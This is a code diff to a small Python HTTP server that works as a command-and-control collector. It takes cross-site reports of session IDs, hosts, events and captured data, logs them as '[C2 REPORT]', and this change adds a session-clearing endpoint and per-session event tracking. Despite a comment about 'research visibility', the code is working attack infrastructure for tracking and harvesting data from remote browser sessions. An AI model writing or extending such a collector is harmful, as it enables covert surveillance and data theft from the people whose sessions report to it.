@@ -76,6 +76,13 @@ class ScannerHandler(BaseHTTPRequestHandler):
             self.send_header('Access-Control-Allow-Origin', '*')
             self.end_headers()
             self.wfile.write(json.dumps(list(MONITORED_SESSIONS.values())).encode())
+        elif self.path == '/clear_sessions':
+            MONITORED_SESSIONS.clear()
+            self.send_response(200)
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": "cleared"}).encode())
         elif self.path.startswith('/report'):
             # Simple reporting via query params for easy cross-site access
             from urllib.parse import urlparse, parse_qs
@@ -122,15 +129,28 @@ class ScannerHandler(BaseHTTPRequestHandler):
                 data = {}
 
             if sid:
-                MONITORED_SESSIONS[sid] = {
+                # Update existing session or create new one
+                session = MONITORED_SESSIONS.get(sid, {
                     "sid": sid,
                     "host": host,
-                    "last_seen": time.time(),
-                    "time_str": datetime.now().strftime("%H:%M:%S")
-                }
+                    "first_seen": datetime.now().strftime("%H:%M:%S"),
+                    "events": 0,
+                    "log": []
+                })
+                
+                session["last_seen"] = time.time()
+                session["last_time_str"] = datetime.now().strftime("%H:%M:%S")
+                session["last_event"] = event
+                session["events"] += 1
+                
+                # Keep a short log of the last 5 events
+                session["log"].append({"time": session["last_time_str"], "event": event})
+                session["log"] = session["log"][-5:]
+                
+                MONITORED_SESSIONS[sid] = session
                 
                 # Log activity to console for research visibility
-                print(f"[C2 REPORT] {datetime.now().strftime('%H:%M:%S')} | Host: {host} | SID: {sid} | Event: {event}")
+                print(f"[C2 REPORT] {session['last_time_str']} | Host: {host} | SID: {sid} | Event: {event} (#{session['events']})")
                 if data:
                     print(f"   - Data: {json.dumps(data)}")
 
